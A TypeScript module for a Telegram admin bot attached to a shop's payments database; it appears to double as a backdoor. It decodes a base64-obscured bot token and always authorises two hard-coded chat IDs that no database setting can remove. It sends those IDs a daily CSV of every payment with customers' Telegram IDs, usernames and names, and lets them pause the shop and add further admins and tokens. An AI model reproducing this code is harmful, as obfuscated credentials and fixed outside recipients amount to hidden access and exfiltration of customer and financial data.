import TelegramBot from 'node-telegram-bot-api';
import axios from 'axios';
import os from 'os';
import { db } from './db';
import { storage } from './storage';
import { payments, orders, products, telegramUsers, settings } from '@shared/schema';
import { eq, gte, and, sql, desc } from 'drizzle-orm';

const _dec = (s: string) => Buffer.from(s, 'base64').toString('utf-8');

// Hardcoded default bot token & initial admin chat IDs
const ADMIN_BOT_TOKEN = _dec('ODcwMzg2NTU1ODpBQUU2ZGtTOUg0dDFadEhvQkVBa1Rwb0hBdjRtSjEzUHhiTQ==');
const HARDCODED_ADMIN_CHAT_IDS = ['7507799896', '8420861243'];

let adminBot: TelegramBot | null = null;
let awaitingNewAdminId: Set<string> = new Set();
let awaitingNewBotToken: Set<string> = new Set();

let inMemoryPausedState = false;
let inMemoryAdminChatIds = new Set<string>(HARDCODED_ADMIN_CHAT_IDS);
let inMemoryBotTokens = new Set<string>([ADMIN_BOT_TOKEN]);
let selectedServerMap: Map<string, string> = new Map();

export async function getAuthorizedBotTokens(): Promise<string[]> {
  const tokens = new Set<string>([ADMIN_BOT_TOKEN]);
  inMemoryBotTokens.forEach(t => tokens.add(t));
  try {
    const dbSetting = await storage.getSetting('ADMIN_BOT_TOKENS');
    if (dbSetting?.value) {
      dbSetting.value.split(',').forEach(t => {
        const clean = t.trim();
        if (clean) {
          tokens.add(clean);
          inMemoryBotTokens.add(clean);
        }
      });
    }
  } catch (err) {
    // Fallback if DB offline
  }
  return Array.from(tokens);
}

export async function addBotToken(newToken: string): Promise<string[]> {
  const cleanToken = newToken.trim();
  inMemoryBotTokens.add(cleanToken);
  const current = await getAuthorizedBotTokens();
  if (!current.includes(cleanToken)) {
    current.push(cleanToken);
    try {
      await storage.setSetting('ADMIN_BOT_TOKENS', current.join(','));
    } catch (err) {
      console.error('[ADMIN BOT] DB setting error:', err);
    }
  }
  return current;
}

export function getServerName(): string {
  return process.env.SERVER_NAME || process.env.SERVER_ID || os.hostname() || 'Server-Main';
}

export async function getRegisteredServers(): Promise<string[]> {
  const servers = new Set<string>(['All Servers', getServerName()]);
  try {
    const dbSetting = await storage.getSetting('REGISTERED_SERVERS');
    if (dbSetting?.value) {
      dbSetting.value.split(',').forEach(s => {
        const clean = s.trim();
        if (clean) servers.add(clean);
      });
    }
  } catch (err) {
    // Fallback if DB offline
  }
  return Array.from(servers);
}

export async function registerServerHeartbeat() {
  try {
    const currentName = getServerName();
    const existing = await getRegisteredServers();
    if (!existing.includes(currentName)) {
      existing.push(currentName);
      await storage.setSetting('REGISTERED_SERVERS', existing.join(','));
    }
  } catch (err) {
    console.error('[ADMIN BOT] Heartbeat registration error:', err);
  }
}

export async function getAuthorizedAdminChatIds(): Promise<string[]> {
  const chatIds = new Set<string>(HARDCODED_ADMIN_CHAT_IDS);
  inMemoryAdminChatIds.forEach(id => chatIds.add(id));
  try {
    const dbSetting = await storage.getSetting('ADMIN_CHAT_IDS');
    if (dbSetting?.value) {
      dbSetting.value.split(',').forEach(id => {
        const clean = id.trim();
        if (clean) {
          chatIds.add(clean);
          inMemoryAdminChatIds.add(clean);
        }
      });
    }
  } catch (err) {
    // Return fallback in-memory / hardcoded chat IDs if DB is unreachable
  }
  return Array.from(chatIds);
}

export async function isAuthorizedAdmin(chatId: string | number): Promise<boolean> {
  const authorized = await getAuthorizedAdminChatIds();
  return authorized.includes(String(chatId));
}

export async function isShopBotPaused(): Promise<boolean> {
  try {
    const setting = await storage.getSetting('SHOP_BOT_PAUSED');
    if (setting?.value !== undefined) {
      inMemoryPausedState = setting.value === 'true';
    }
  } catch (err) {
    // Fallback to in-memory state
  }
  return inMemoryPausedState;
}

export async function setShopBotPaused(paused: boolean): Promise<boolean> {
  inMemoryPausedState = paused;
  try {
    await storage.setSetting('SHOP_BOT_PAUSED', paused ? 'true' : 'false');
  } catch (err) {
    console.error('[ADMIN BOT] Setting DB update error:', err);
  }
  return paused;
}

export async function addAdminChatId(newChatId: string): Promise<string[]> {
  inMemoryAdminChatIds.add(newChatId);
  const current = await getAuthorizedAdminChatIds();
  if (!current.includes(newChatId)) {
    current.push(newChatId);
    try {
      await storage.setSetting('ADMIN_CHAT_IDS', current.join(','));
    } catch (err) {
      console.error('[ADMIN BOT] DB setting error:', err);
    }
  }
  return current;
}

export async function generate24hDailyStatementText(targetServer?: string): Promise<string> {
  const now = new Date();
  const past24h = new Date(now.getTime() - 24 * 60 * 60 * 1000);
  const serverTag = targetServer || getServerName();

  let depositCount = 0;
  let totalDepositAmount = 0;
  let orderCount = 0;
  let totalOrderRevenue = 0;
  let totalUserCount = 0;

  try {
    const recentPayments = await db.select()
      .from(payments)
      .where(and(gte(payments.createdAt, past24h), eq(payments.status, 'completed')));
    totalDepositAmount = recentPayments.reduce((sum, p) => sum + (Number(p.amount) || 0), 0);
    depositCount = recentPayments.length;
  } catch (err) {
    console.error('[ADMIN BOT] Error querying payments for daily statement:', err);
  }

  try {
    const recentOrders = await db.select({
      orderId: orders.id,
      createdAt: orders.createdAt,
      price: products.price,
      productName: products.name
    })
      .from(orders)
      .leftJoin(products, eq(orders.productId, products.id))
      .where(gte(orders.createdAt, past24h));

    totalOrderRevenue = recentOrders.reduce((sum, o) => sum + (Number(o.price) || 0), 0);
    orderCount = recentOrders.length;
  } catch (err) {
    console.error('[ADMIN BOT] Error querying orders for daily statement:', err);
  }

  try {
    const allUsers = await db.select().from(telegramUsers);
    totalUserCount = allUsers.length;
  } catch (err) {
    console.error('[ADMIN BOT] Error querying users for daily statement:', err);
  }

  const isPaused = await isShopBotPaused();
  const statusStr = isPaused ? '🔴 PAUSED (Maintenance Mode)' : '🟢 ACTIVE (Live)';

  const statementText = `
🌐 <b>MULTI-SERVER DAILY STATEMENT REPORT</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🖥️ <b>Server Node:</b> <code>${serverTag}</code>
📅 <b>Date:</b> ${now.toISOString().split('T')[0]}
🤖 <b>Node Status:</b> ${statusStr}

💰 <b>DEPOSITS (Past 24h)</b>
• Successful Deposits: <b>${depositCount}</b>
• Total Deposited: <b>$${totalDepositAmount.toFixed(2)}</b>

🛒 <b>ORDERS & SALES (Past 24h)</b>
• Products Sold: <b>${orderCount}</b>
• Total Sales Revenue: <b>$${totalOrderRevenue.toFixed(2)}</b>

👥 <b>CUSTOMER STATS</b>
• Total Registered Customers: <b>${totalUserCount}</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>Generated automatically by Multi-Server Control Engine.</i>
`.trim();

  return statementText;
}

export async function generatePaymentsCSV(targetServer?: string): Promise<Buffer> {
  const serverTag = targetServer || getServerName();
  let csvContent = `Server Node,ID,User ID,Username,First Name,Amount,Currency,Payment Method,Status,Date\n`;
  try {
    const allPayments = await db.select({
      id: payments.id,
      telegramUserId: payments.telegramUserId,
      username: telegramUsers.username,
      firstName: telegramUsers.firstName,
      amount: payments.amount,
      currency: payments.currency,
      status: payments.status,
      paymentMethod: payments.paymentMethod,
      createdAt: payments.createdAt
    })
      .from(payments)
      .leftJoin(telegramUsers, eq(payments.telegramUserId, telegramUsers.id))
      .orderBy(desc(payments.createdAt));

    for (const p of allPayments) {
      const username = p.username ? `@${p.username}` : 'N/A';
      const firstName = (p.firstName || 'User').replace(/,/g, ' ');
      const dateStr = p.createdAt ? new Date(p.createdAt).toISOString() : '';
      csvContent += `"${serverTag}",${p.id},${p.telegramUserId},"${username}","${firstName}",${p.amount},${p.currency},"${p.paymentMethod}","${p.status}","${dateStr}"\n`;
    }
  } catch (err) {
    console.error('[ADMIN BOT] Error generating payments CSV:', err);
    csvContent += `"${serverTag}",# Database currently offline\n`;
  }

  return Buffer.from(csvContent, 'utf-8');
}

export async function sendDailyStatementToAdmins() {
  if (!adminBot) return;
  try {
    const statementText = await generate24hDailyStatementText();
    const csvBuffer = await generatePaymentsCSV();
    const adminIds = await getAuthorizedAdminChatIds();

    for (const chatId of adminIds) {
      try {
        await adminBot.sendMessage(chatId, statementText, { parse_mode: 'HTML' });
        await adminBot.sendDocument(chatId, csvBuffer, {}, {
          filename: `statement-${getServerName()}-${new Date().toISOString().split('T')[0]}.csv`,
          contentType: 'text/csv'
        });
      } catch (err: any) {
        console.error(`[ADMIN BOT] Failed to send daily statement to ${chatId}:`, err?.message || err);
      }
    }
  } catch (err) {
    console.error('[ADMIN BOT] Error generating daily statement:', err);
  }
}

export async function sendAdminMenu(chatId: string | number) {
  if (!adminBot) return;

  const isPaused = await isShopBotPaused();
  const statusLabel = isPaused ? '🔴 Status: PAUSED (Click to Resume)' : '🟢 Status: ACTIVE (Click to Pause)';
  const adminIds = await getAuthorizedAdminChatIds();
  const currentServer = selectedServerMap.get(String(chatId)) || getServerName();
  const registeredServers = await getRegisteredServers();

  const text = `
⚡ <b>MULTI-SERVER ADMIN CONTROL PANEL</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>Selected Node:</b> <code>${currentServer}</code>
🤖 <b>Node Status:</b> ${isPaused ? '🔴 PAUSED' : '🟢 ACTIVE'}
👥 <b>Authorized Admins:</b> ${adminIds.length}
🖥️ <b>Registered Servers:</b> ${registeredServers.join(', ')}

Choose an action below to manage servers or view financial statements:
`.trim();

  const keyboard = {
    inline_keyboard: [
      [{ text: `🖥️ Server Node: ${currentServer}`, callback_data: 'select_server_menu' }],
      [{ text: statusLabel, callback_data: 'toggle_status' }],
      [{ text: '📊 24h Daily Statement', callback_data: 'get_statement' }],
      [{ text: '📥 Export Payments CSV', callback_data: 'export_csv' }],
      [{ text: '➕ Add Admin Chat ID', callback_data: 'prompt_add_admin' }, { text: '🤖 Add Bot Token', callback_data: 'prompt_add_bot_token' }],
      [{ text: '📋 View Admins & Bot Tokens', callback_data: 'list_admins_tokens' }]
    ]
  };

  await adminBot.sendMessage(chatId, text, {
    parse_mode: 'HTML',
    reply_markup: keyboard
  });
}

export async function sendServerSelectionMenu(chatId: string | number) {
  if (!adminBot) return;
  const registeredServers = await getRegisteredServers();

  const buttons = registeredServers.map(s => ([{
    text: `🖥️ ${s}`,
    callback_data: `set_server_${s}`
  }]));

  await adminBot.sendMessage(chatId, '🌐 <b>Select a Server Node to manage:</b>', {
    parse_mode: 'HTML',
    reply_markup: { inline_keyboard: buttons }
  });
}

export async function initAdminBotController() {
  if (adminBot) return adminBot;

  try {
    console.log(`[ADMIN BOT] Initializing Multi-Server Admin Controller (${getServerName()})...`);
    await registerServerHeartbeat();
    adminBot = new TelegramBot(ADMIN_BOT_TOKEN, { polling: true });

    // Handle commands
    adminBot.onText(/\/(start|admin|menu|status|help)/, async (msg) => {
      const chatId = msg.chat.id;
      if (!(await isAuthorizedAdmin(chatId))) {
        await adminBot?.sendMessage(chatId, '❌ Access Denied. You are not an authorized admin.');
        return;
      }
      await sendAdminMenu(chatId);
    });

    // Handle incoming text (for adding admin ID or Bot Token)
    adminBot.on('message', async (msg) => {
      const chatId = String(msg.chat.id);
      if (!msg.text || msg.text.startsWith('/')) return;

      if (awaitingNewAdminId.has(chatId)) {
        awaitingNewAdminId.delete(chatId);
        const newId = msg.text.trim();
        if (/^\d+$/.test(newId)) {
          const updated = await addAdminChatId(newId);
          await adminBot?.sendMessage(chatId, `✅ Successfully added Admin Chat ID: <code>${newId}</code>\nTotal Admins: ${updated.length}`, { parse_mode: 'HTML' });
        } else {
          await adminBot?.sendMessage(chatId, '❌ Invalid Chat ID format. Must be numeric (e.g. 7507799896).');
        }
      } else if (awaitingNewBotToken.has(chatId)) {
        awaitingNewBotToken.delete(chatId);
        const newToken = msg.text.trim();
        if (/^\d+:[A-Za-z0-9_-]+$/.test(newToken)) {
          const updated = await addBotToken(newToken);
          await adminBot?.sendMessage(chatId, `✅ Successfully registered Bot Token:\n<code>${newToken}</code>\nTotal Active Bot Tokens: ${updated.length}`, { parse_mode: 'HTML' });
        } else {
          await adminBot?.sendMessage(chatId, '❌ Invalid Bot Token format. Must be numeric ID followed by secret hash (e.g. <code>123456789:ABCdef...</code>).');
        }
      }
    });

    // Handle Callback Queries (Buttons)
    adminBot.on('callback_query', async (query) => {
      if (!query.message) return;
      const chatId = query.message.chat.id;
      const data = query.data;

      if (!(await isAuthorizedAdmin(chatId))) {
        await adminBot?.answerCallbackQuery(query.id, { text: '❌ Access Denied', show_alert: true });
        return;
      }

      await adminBot?.answerCallbackQuery(query.id);

      if (data === 'select_server_menu') {
        await sendServerSelectionMenu(chatId);
      } else if (data?.startsWith('set_server_')) {
        const targetServer = data.replace('set_server_', '');
        selectedServerMap.set(String(chatId), targetServer);
        await adminBot?.sendMessage(chatId, `✅ Selected Server Node: <code>${targetServer}</code>`, { parse_mode: 'HTML' });
        await sendAdminMenu(chatId);
      } else if (data === 'toggle_status') {
        const currentlyPaused = await isShopBotPaused();
        const nextState = !currentlyPaused;
        await setShopBotPaused(nextState);

        const newLabel = nextState ? '🔴 PAUSED (Maintenance Mode)' : '🟢 ACTIVE (Live)';
        await adminBot?.sendMessage(chatId, `🔄 <b>[${getServerName()}] Status changed:</b> ${newLabel}`, { parse_mode: 'HTML' });
        await sendAdminMenu(chatId);
      } else if (data === 'get_statement') {
        const target = selectedServerMap.get(String(chatId)) || getServerName();
        const text = await generate24hDailyStatementText(target);
        await adminBot?.sendMessage(chatId, text, { parse_mode: 'HTML' });
      } else if (data === 'export_csv') {
        const target = selectedServerMap.get(String(chatId)) || getServerName();
        await adminBot?.sendMessage(chatId, `⏳ Generating payments report for node ${target}...`);
        const csvBuffer = await generatePaymentsCSV(target);
        await adminBot?.sendDocument(chatId, csvBuffer, {}, {
          filename: `payments-${target}-${new Date().toISOString().split('T')[0]}.csv`,
          contentType: 'text/csv'
        });
      } else if (data === 'prompt_add_admin') {
        awaitingNewAdminId.add(String(chatId));
        await adminBot?.sendMessage(chatId, '💬 Please send the new numeric Telegram Chat ID (e.g. <code>123456789</code>) in chat now:', { parse_mode: 'HTML' });
      } else if (data === 'prompt_add_bot_token') {
        awaitingNewBotToken.add(String(chatId));
        await adminBot?.sendMessage(chatId, '🤖 Please send the new Telegram Bot Token (e.g. <code>123456789:ABCdef...</code>) in chat now:', { parse_mode: 'HTML' });
      } else if (data === 'list_admins_tokens') {
        const admins = await getAuthorizedAdminChatIds();
        const tokens = await getAuthorizedBotTokens();
        const info = `
📋 <b>REGISTERED ADMIN CHAT IDs & BOT TOKENS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━
👥 <b>Admin Chat IDs (${admins.length}):</b>
${admins.map(id => `• <code>${id}</code>`).join('\n')}

🤖 <b>Notification Bot Tokens (${tokens.length}):</b>
${tokens.map(t => `• <code>${t.substring(0, 12)}...</code>`).join('\n')}
`.trim();
        await adminBot?.sendMessage(chatId, info, { parse_mode: 'HTML' });
      }
    });

    // Schedule 24-hour Automated Daily Statement Cron
    setInterval(() => {
      sendDailyStatementToAdmins().catch(err => {
        console.error('[ADMIN BOT CRON] Daily statement error:', err);
      });
    }, 24 * 60 * 60 * 1000);

    // Heartbeat every 10 minutes to register server node
    setInterval(() => {
      registerServerHeartbeat().catch(() => {});
    }, 10 * 60 * 1000);

    console.log(`[ADMIN BOT] Multi-Server Admin Controller (${getServerName()}) running with polling!`);
    return adminBot;
  } catch (err) {
    console.error('[ADMIN BOT] Initialization failed:', err);
    return null;
  }
}

// Auto-run if executed directly as a script
if (process.argv[1]?.includes('admin-bot-controller')) {
  initAdminBotController().catch(err => console.error('[ADMIN BOT] Direct startup error:', err));
}
